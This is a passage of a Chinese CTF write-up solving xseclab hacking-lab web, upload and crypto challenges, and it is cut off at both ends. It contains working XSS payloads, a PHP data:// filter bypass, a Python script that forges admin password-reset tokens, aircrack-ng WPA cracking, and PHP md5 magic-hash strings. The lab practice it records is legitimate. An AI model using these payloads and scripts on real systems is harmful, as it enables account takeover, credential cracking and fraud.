src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/32380741.jpg" alt="" title="" class="">                <p></p>            </figure><p>注意是从<code>chars</code>之后开始的14位</p><h4 id="逗比验证码第一期"><a href="#逗比验证码第一期" class="headerlink" title="逗比验证码第一期"></a>逗比验证码第一期</h4><p>这题的验证码验证一次之后不过期，所以。。<br>抓包爆破即可</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/87191568.jpg" alt="" title="" class="">                <p></p>            </figure><p>爆破之后，密码是1238，拿到key</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/91760909.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="逗比验证码第二期"><a href="#逗比验证码第二期" class="headerlink" title="逗比验证码第二期"></a>逗比验证码第二期</h4><p>题目给提示，验证就失效，但是实际上验证一次之后验证码就不需要了，令值为空即可开始爆破。</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/65751756.jpg" alt="" title="" class="">                <p></p>            </figure><p>爆破后得到密码1228，拿到key</p><h4 id="逗比的验证码第三期（SESSION）"><a href="#逗比的验证码第三期（SESSION）" class="headerlink" title="逗比的验证码第三期（SESSION）"></a>逗比的验证码第三期（SESSION）</h4><p>这题做法与上题一样，密码是1298，拿到key</p><h4 id="微笑一下就能过关了"><a href="#微笑一下就能过关了" class="headerlink" title="微笑一下就能过关了"></a>微笑一下就能过关了</h4><p><code>源代码</code>处点击可以看到源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">    header(&quot;Content-type: text/html; charset=utf-8&quot;);</span><br><span class="line">    if (isset($_GET[&apos;view-source&apos;])) &#123; </span><br><span class="line">        show_source(__FILE__); </span><br><span class="line">        exit(); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    include(&apos;flag.php&apos;); </span><br><span class="line"></span><br><span class="line">    $smile = 1;  </span><br><span class="line"></span><br><span class="line">   if (!isset ($_GET[&apos;^_^&apos;])) $smile = 0;  </span><br><span class="line">    if (preg_match (&apos;/\./&apos;, $_GET[&apos;^_^&apos;])) $smile = 0;  </span><br><span class="line">    if (preg_match (&apos;/%/&apos;, $_GET[&apos;^_^&apos;])) $smile = 0;  </span><br><span class="line">    if (preg_match (&apos;/[0-9]/&apos;, $_GET[&apos;^_^&apos;])) $smile = 0;  </span><br><span class="line">    if (preg_match (&apos;/http/&apos;, $_GET[&apos;^_^&apos;]) ) $smile = 0;  </span><br><span class="line">    if (preg_match (&apos;/https/&apos;, $_GET[&apos;^_^&apos;]) ) $smile = 0;  </span><br><span class="line">    if (preg_match (&apos;/ftp/&apos;, $_GET[&apos;^_^&apos;])) $smile = 0;  </span><br><span class="line">    if (preg_match (&apos;/telnet/&apos;, $_GET[&apos;^_^&apos;])) $smile = 0;  </span><br><span class="line">    if (preg_match (&apos;/_/&apos;, $_SERVER[&apos;QUERY_STRING&apos;])) $smile = 0; </span><br><span class="line">    if ($smile) &#123; </span><br><span class="line">        if (@file_exists ($_GET[&apos;^_^&apos;])) $smile = 0;  </span><br><span class="line">    &#125;  </span><br><span class="line">    if ($smile) &#123; </span><br><span class="line">        $smile = @file_get_contents ($_GET[&apos;^_^&apos;]);  </span><br><span class="line">        if ($smile === &quot;(●&apos;◡&apos;●)&quot;) die($flag);  </span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这题比较复杂，</p><p>首先<code>get</code>提交的参数中不能有特殊字符，数字<br>而且<code>http</code>、<code>https</code>、<code>ftp</code>等协议不能用，<br><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>中不能出现<code>_</code>字符，但是提交的变量却是<code>^_^</code><br>并且不能是文件,但是却有个<code>file_get_contents</code>函数，</p><p>绕过<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>很简单，因为<code>QUERY_STRING</code>会把<code>.</code>、<code>[</code>等符号解析成<code>_</code><br>，所以将提交的参数改为<code>^.^</code>、<code>^[^</code>等即可，<br>而绕过<code>file_exists</code>，就是用php的<code>data</code>伪协议，详情请点击<a href="https://cherrygk.github.io/2018/07/12/phpagree/" target="_blank" rel="noopener">php伪协议学习</a></p><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[^=data://text/plain;charset=unicode,(●&apos;◡&apos;●)</span><br></pre></td></tr></table></figure></p><h4 id="逗比的手机验证码"><a href="#逗比的手机验证码" class="headerlink" title="逗比的手机验证码"></a>逗比的手机验证码</h4><p>这题不清楚为什么要出，没什么技术含量，<br>直接用13388886666手机号获取验证码，然后用13388886667<code>submit</code>就可以得到key</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/14383853.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="基情燃烧的岁月"><a href="#基情燃烧的岁月" class="headerlink" title="基情燃烧的岁月"></a>基情燃烧的岁月</h4><p>这题点击获取手机验证码之后提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">手机验证码是：验证码发到手机上了，你看不到..是3位纯数字，开头不为0</span><br></pre></td></tr></table></figure></p><p>看不到，估计是爆破了，但是在爆破之前需要点击一下获取验证码，不然会一直提示错误，<br>然后第一次爆破的结果是：</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/20411096.jpg" alt="" title="" class="">                <p></p>            </figure><p>又得到一个手机号<code>13399999999</code>，同样的方法再爆破一次就能拿到key</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/62788792.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="验证码识别"><a href="#验证码识别" class="headerlink" title="验证码识别"></a>验证码识别</h4><p>这题前面的方法都不能用，只能老老实实的识别验证码了，因为全是数字，所以比较好识别，这里用的工具是<code>Pkav HTTP Fuzzer</code><br>使用方法：<br>将抓到的数据包内容复制粘贴进<code>请求包</code>处</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/74877318.jpg" alt="" title="" class="">                <p></p>            </figure><p>下方的使用与bp差不多，手机验证码变量<code>添加标记</code>即可，验证码变量<code>添加验证码</code>即可，<br>然后将验证码图片的地址复制下来，工具底部有<code>图片型验证码</code>，将地址复制进去，<br>在头部请求加上自己的cookie,<br>在下方点击识别测试：</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/37045585.jpg" alt="" title="" class="">                <p></p>            </figure><p>回到<code>变体设置</code>，设置自己payload，在重放设置栏选择数字自增长模式，</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/35105536.jpg" alt="" title="" class="">                <p></p>            </figure><p>在<code>重放选项</code>处将线程设置为<code>单线程</code>，因为速度过快可能会报错<br>然后底下选择<code>发包器</code>,点击启动即可，一段时间后得到flag</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/1709369.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="XSS基础关"><a href="#XSS基础关" class="headerlink" title="XSS基础关"></a>XSS基础关</h4><p>XSS的题目在<code>Google浏览器</code>里做不了，所以只能在其他浏览器下做了，这里用的是<code>火狐浏览器</code><br>XSS可以先看看js的代码，在<code>http://lab1.xseclab.com/xssjs/xss_check.php</code>处可以看到给出key的代码，先试试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(HackingLab)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>直接就success，得到了key</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/67919307.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="XSS基础2-简单绕过"><a href="#XSS基础2-简单绕过" class="headerlink" title="XSS基础2:简单绕过"></a>XSS基础2:简单绕过</h4><p>这题用上题的payload的话会报错，多试几次发现是过滤了<code>&lt;script&gt;</code>，<br>用<code>&lt;img&gt;</code>就能绕过<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=haha onerror=alert(HackingLab)&gt;</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/52247146.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="XSS基础3-检测与构造"><a href="#XSS基础3-检测与构造" class="headerlink" title="XSS基础3:检测与构造"></a>XSS基础3:检测与构造</h4><p>这题输入的值会在下方的<code>input</code>框展示出来，<br>同样过滤了<code>&lt;script&gt;</code>、<code>javascript</code>、<code>&lt;img src&gt;</code> ，但是当查看源代码的时候可以发现，<br><code>&#39;</code>没有过滤，所以可以用一下<code>闭合</code>的思想，用bp抓包试验一下</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/63393393.jpg" alt="" title="" class="">                <p></p>            </figure><p>输入<code>alert(HackingLab)</code>发现没有过滤<code>alert</code>，但是输入<code>onmouseover=alert(HackingLab)</code>，发现被检测到了，最终发现一个问题，当输入<code>alert</code>时，后面的添加的事件不会被过滤<br>构造payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert&apos;onmouseover=alert(HackingLab)&gt;</span><br></pre></td></tr></table></figure></p><p>然后把鼠标移到第二个输入框即可弹窗，得到key:</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/48168602.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="Principle很重要的XSS"><a href="#Principle很重要的XSS" class="headerlink" title="Principle很重要的XSS"></a>Principle很重要的XSS</h4><p>这题跟上题类似，但是只是<code>input框</code>变成了<code>href</code>,我用上题的payload直接就得到key了。不清楚为什么给了这么多hint</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/74204887.jpg" alt="" title="" class="">                <p></p>            </figure><p>这些XSS的题目都可以用bp抓<code>响应包</code>来做，应该是后端没有做防护，这里就用最后一个题目做示范<br>首先抓到<code>请求包</code>，右键选择</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/74603677.jpg" alt="" title="" class="">                <p></p>            </figure><p>点击<code>Forward</code>，此时可以看到<code>响应包</code>也就是<code>response</code>包，<br>在下方输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=haha onerror=alert(HackingLab)&gt;</span><br></pre></td></tr></table></figure></p><p>再点击<code>Forward</code>，因为数据包有点多，所以一直点击<code>Forward</code>直到弹窗就行，弹窗之后还需要点击<code>Forward</code>得到后台给的key，同样能得到<code>key</code></p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/10523935.jpg" alt="" title="" class="">                <p></p>            </figure><h3 id="注入关"><a href="#注入关" class="headerlink" title="注入关"></a>注入关</h3><p>注入关暂时做不了，题目服务器有问题</p><h3 id="上传关"><a href="#上传关" class="headerlink" title="上传关"></a>上传关</h3><h4 id="请上传一张jpg格式的图片1"><a href="#请上传一张jpg格式的图片1" class="headerlink" title="请上传一张jpg格式的图片1"></a>请上传一张jpg格式的图片1</h4><p>这题试了几次之后发现是前端验证,上传一个jpg，然后用bp抓包改一下即可拿到key</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/74649040.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="请上传一张jpg格式的图片2"><a href="#请上传一张jpg格式的图片2" class="headerlink" title="请上传一张jpg格式的图片2"></a>请上传一张jpg格式的图片2</h4><p>跟第一题一样的做法。</p><h4 id="请上传一张jpg格式的图片3"><a href="#请上传一张jpg格式的图片3" class="headerlink" title="请上传一张jpg格式的图片3"></a>请上传一张jpg格式的图片3</h4><p>这题后端也做了验证，可以先用前面题目的方法试试，发现提交成功但是没有返回key</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/56022428.jpg" alt="" title="" class="">                <p></p>            </figure><p>试了试加一个.jpg</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/3655210.jpg" alt="" title="" class="">                <p></p>            </figure><p>后端代码可能是验证文件名有没有<code>.jpg</code>，拿到key</p><h3 id="解密关"><a href="#解密关" class="headerlink" title="解密关"></a>解密关</h3><h4 id="以管理员身份登录系统"><a href="#以管理员身份登录系统" class="headerlink" title="以管理员身份登录系统"></a>以管理员身份登录系统</h4><p>打开题目发现这是一个标准的登录框，有<code>忘记密码</code>功能，并且题目提示重置管理员密码就能得到<code>key</code>，<br>先了解一下重置密码功能，在这个输入框中输入的值会被传到后端进行重置，<br>然后给出<code>重置密码链接</code>，但是<code>admin</code>用户重置之后没有提示,</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/83610629.jpg" alt="" title="" class="">                <p></p>            </figure><p>所以我们照常在每个页面都抓包试一试，在这个页面可以看到<code>重置密码链接</code>提交的值中有两个参数，<br>一个是<code>sukey</code>，一个是<code>username</code></p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/2536875.jpg" alt="" title="" class="">                <p></p>            </figure><p>将<code>username</code>改为<code>admin</code>，发现什么都没有显示:</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/64114422.jpg" alt="" title="" class="">                <p></p>            </figure><p>现在只能看另一个参数<code>sukey</code>了，长度看起来像<code>md5</code>，<a href="https://www.somd5.com/" target="_blank" rel="noopener">md5解密</a>试试：</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/23208333.jpg" alt="" title="" class="">                <p></p>            </figure><p>解出来是一个<code>时间戳</code>，转为北京时间是<code>2018/7/19 14:5:54</code></p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/15833912.jpg" alt="" title="" class="">                <p></p>            </figure><p>就是我刚刚提交的时间，所以思路大概就是将上传的时间转为<code>Unix时间戳</code>，然后<code>md5</code>加密，<br>将<code>sukey</code>和<code>username</code>分别等于<code>md5加密后的时间戳</code>和<code>admin</code>提交，<br>并且响应包得到的时间是比实际时间少的，</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/15606099.jpg" alt="" title="" class="">                <p></p>            </figure><p>这里给出两种做法</p><ul><li>第一种是手动将响应包里的时间手动转为<code>Unix时间戳</code></li><li>第二种是用脚本获取响应包的时间</li></ul><p>第一种：</p><p>先提交<code>username</code>为<code>admin</code>，然后记录下<code>响应头</code>的<code>date</code></p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/23317299.jpg" alt="" title="" class="">                <p></p>            </figure><p>然后去<a href="http://tool.chinaz.com/Tools/unixtime.aspx" target="_blank" rel="noopener">在线网站</a>转为时间戳,<br>记住小时需要跟北京时间一样，其他都一样</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/70214163.jpg" alt="" title="" class="">                <p></p>            </figure><p>将<code>sukey</code>等于<code>时间戳md5加密后的值</code>访问即可，</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/34392445.jpg" alt="" title="" class="">                <p></p>            </figure><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/97004605.jpg" alt="" title="" class="">                <p></p>            </figure><p>得到key</p><p>第二种是用python，但是<code>time()</code>函数得到的当前时间戳与上传时的对不上，<br>所以只能与手动的方法一样，从响应头里获取时间。<br>附上脚本:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests,hashlib,time,re</span><br><span class="line"></span><br><span class="line">def month(month):</span><br><span class="line">months = [&quot;Jua&quot;,&quot;Feb&quot;,&quot;Mar&quot;,&quot;Apr&quot;,&quot;May&quot;,&quot;Jun&quot;,&quot;Jul&quot;,&quot;Aug&quot;,&quot;Sep&quot;,&quot;Oct&quot;,&quot;Nov&quot;,&quot;Dec&quot;]</span><br><span class="line">for a in range(0,len(months)):</span><br><span class="line">if months[a] == month:</span><br><span class="line">return a+1</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line">url = &apos;http://lab1.xseclab.com/password1_dc178aa12e73cfc184676a4100e07dac/resetpassword.php&apos;</span><br><span class="line">post = &#123;&apos;username&apos;:&apos;admin&apos;&#125;</span><br><span class="line">a = r.post(url,data = post)</span><br><span class="line">list = re.compile(r&apos;[\,\s\:]+&apos;).split(a.headers[&apos;date&apos;])</span><br><span class="line">ct = (list[3]+&apos;-&apos;+str(month(list[2]))+&apos;-&apos;+list[1]+&apos; &apos;+str(int(list[4])+8)+&apos;:&apos;+list[5]+&apos;:&apos;+list[6])</span><br><span class="line">sukey = hashlib.new(&apos;md5&apos;,str(int(time.mktime(time.strptime(ct,&apos;%Y-%m-%d %H:%M:%S&apos;)))).encode(encoding=&apos;utf-8&apos;)).hexdigest()</span><br><span class="line">url2 = &apos;http://lab1.xseclab.com/password1_dc178aa12e73cfc184676a4100e07dac/reset.php?sukey=&apos;+sukey+&apos;&amp;username=admin&apos;</span><br><span class="line">print(r.get(url2).text)</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/92437870.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="邂逅对门的妹纸"><a href="#邂逅对门的妹纸" class="headerlink" title="邂逅对门的妹纸"></a>邂逅对门的妹纸</h4><p>这题给的是一个<code>wifi的握手包</code>，kali中有专门的工具来破解握手包<code>aircrack</code>，<br>但是需要字典，给了<code>年级和年份</code>，估计密码就是生日了，<br>先从网上下载一个生日字典，也可以自己生成<br>使用方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng wifi-crack.cap -w pass.txt</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/9407114.jpg" alt="" title="" class="">                <p></p>            </figure><p>得到生日密码之后按照题目要求加密提交即可</p><h4 id="万恶的Cisco"><a href="#万恶的Cisco" class="headerlink" title="万恶的Cisco"></a>万恶的Cisco</h4><p>直接<code>GoogleCisco破解</code>,<a href="http://www.toolsxx.com/code/cisco.php" target="_blank" rel="noopener">Cisco思科密码在线解密</a></p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/72556291.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="万恶的加密"><a href="#万恶的加密" class="headerlink" title="万恶的加密"></a>万恶的加密</h4><p>huawei交换机的加密方式，有人写过<a href="https://github.com/grutz/h3c-pt-tools" target="_blank" rel="noopener">python工具</a><br>使用方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python27 hh3c_cipher.py -c &quot;aK9Q4I)J&apos;#[Q=^Q`MAF4&lt;1!!&quot;</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/54131428.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="喜欢泡网吧的小明"><a href="#喜欢泡网吧的小明" class="headerlink" title="喜欢泡网吧的小明"></a>喜欢泡网吧的小明</h4><p>给的是一个<code>dump</code>文件，里头的内容有些看不懂，看了网上的wp才知道做的，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先将当下的数据不做改动，进行刷卡，显示卡片异常。说明，卡片的头信息错误。一般的卡片的头信息应该是前8~16个字节。头信息应该有个开始和结束标准信息。</span><br></pre></td></tr></table></figure></p><p>直接将文件上传的话会显示<code>卡片异常</code>，并且题目提示了有一个字节产生了错误。</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/23883661.jpg" alt="" title="" class="">                <p></p>            </figure><p>网上给的wp是将开头的<code>AA</code>变为<code>8A</code>, 原因是头部信息错误所以读取失败，具体为什么改为<code>8A</code>也不清楚，<br>但是改为<code>8A</code>后，提示:</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/95794273.jpg" alt="" title="" class="">                <p></p>            </figure><p>可以正常刷卡了，但是余额为100，往下看文件内容，有<code>1027</code>，转为10进制是<code>4135</code>，没有啥关系，<br>但是这些卡的加密方式是有可能倒叙的，所以再试试<code>2710</code>，可以发现刚好是<code>10000</code>，对应的是100.00，所以我们现在只需要将<code>20000</code>转为16进制，然后倒序即可,将两个<code>1027</code>的值改为<code>204E</code>，保存再上传即可</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/99847806.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="异常数据"><a href="#异常数据" class="headerlink" title="异常数据"></a>异常数据</h4><p>题目给出一段加密后的字符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AGV5IULSB3ZLVSE=</span><br></pre></td></tr></table></figure></p><p>数字和字母，估计是base32，但是base32解不出，所以大概率是base64，只是把其中的小写字母换成了大写，<br>base64是3位为一组，加密成4个字节，所以分成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AGV5</span><br><span class="line">IULS</span><br><span class="line">B3ZL</span><br><span class="line">VSE=</span><br></pre></td></tr></table></figure></p><p>首先看看第一次解密:</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/50682055.jpg" alt="" title="" class="">                <p></p>            </figure><p>出了乱码，所以将A改为小写</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/34427238.jpg" alt="" title="" class="">                <p></p>            </figure><p>可以发现思路就是这样，<code>hey</code>已经出来了，所以可以进行下一组，重复这个步骤即可</p><p>最终为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aGV5</span><br><span class="line">IUls</span><br><span class="line">b3Zl</span><br><span class="line">VSE=</span><br></pre></td></tr></table></figure><p><a href="http://www.qqxiuzi.cn/bianma/base64.htm" target="_blank" rel="noopener">解码链接</a></p><h4 id="md5真的能碰撞嘛"><a href="#md5真的能碰撞嘛" class="headerlink" title="md5真的能碰撞嘛?"></a>md5真的能碰撞嘛?</h4><p>题目点击<code>__</code>后，可以直接看到源码，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag=FLAG;</span><br><span class="line">if(isset($_POST[&quot;password&quot;]))&#123;</span><br><span class="line">$password=$_POST[&apos;password&apos;];</span><br><span class="line">    $rootadmin=&quot;!1793422703!&quot;;</span><br><span class="line">    if($password==$rootadmin)&#123;die(&quot;Please do not attack admin account!&quot;);&#125;</span><br><span class="line">    </span><br><span class="line">    if(md5($password)==md5($rootadmin))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;Password Error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>大概意思就是<code>$rootadmin</code>的md5要跟上传上去的值的md5一样，而且本身的值也不能一样<br>先看看<code>!1793422703!</code>的md5是多少,<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0e332932043729729062996282883873</span><br></pre></td></tr></table></figure></p><p>0e后面全是数字，php弱类型，POST<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=240610708或者QNKCDZO</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/89887581.jpg" alt="" title="" class="">                <p></p>            </figure><p>拿到key</p><h4 id="小明爱上了一个搞硬件的小姑凉"><a href="#小明爱上了一个搞硬件的小姑凉" class="headerlink" title="小明爱上了一个搞硬件的小姑凉"></a>小明爱上了一个搞硬件的小姑凉</h4><p>题目给的是一个<code>logicdata</code>文件，提示是一个逻辑分析仪抓包数据，<br>winhex打开之后，在文件的最后有一串英文，</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/5595813.jpg" alt="" title="" class="">                <p></p>            </figure><p>搜一搜<code>saleae</code>,发现需要下载这个公司的软件才能解密<br><a href="https://www.saleae.com/zh/downloads/" target="_blank" rel="noopener">下载链接</a><br>下载完用这个号软件打开之后即可看到答案，英文不好的同学注意，<code>COMMA</code>是逗号的意思</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/73840994.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="有签名限制的读取任意文件"><a href="#有签名限制的读取任意文件" class="headerlink" title="有签名限制的读取任意文件"></a>有签名限制的读取任意文件</h4><p>右键查看源代码可以看到部分代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">include &quot;_flag.php&quot;;</span><br><span class="line">include &quot;salt.php&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$mysalt=SALT;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;filepath&apos;])&amp;&amp;!empty($_GET[&apos;filepath&apos;]) &amp;&amp;isset($_GET[&apos;sign&apos;]) &amp;&amp;!empty($_GET[&apos;sign&apos;]))&#123;</span><br><span class="line">myreadfile($_GET[&apos;filepath&apos;],$mysalt,$_GET[&apos;sign&apos;]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">//降低一点复杂度</span><br><span class="line">var_dump(strlen($mysalt));</span><br><span class="line">testsign(&quot;/etc/hosts&quot;,$mysalt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function myhash($message,$mysalt)&#123;</span><br><span class="line">return md5($mysalt.$message);</span><br><span class="line">&#125;</span><br><span class="line">function checksign($message,$mysalt,$sign)&#123;</span><br><span class="line">    if($sign==myhash($message,$mysalt))&#123;</span><br><span class="line">    return True;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">    return False;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function myreadfile($filepath,$mysalt,$sign)&#123;</span><br><span 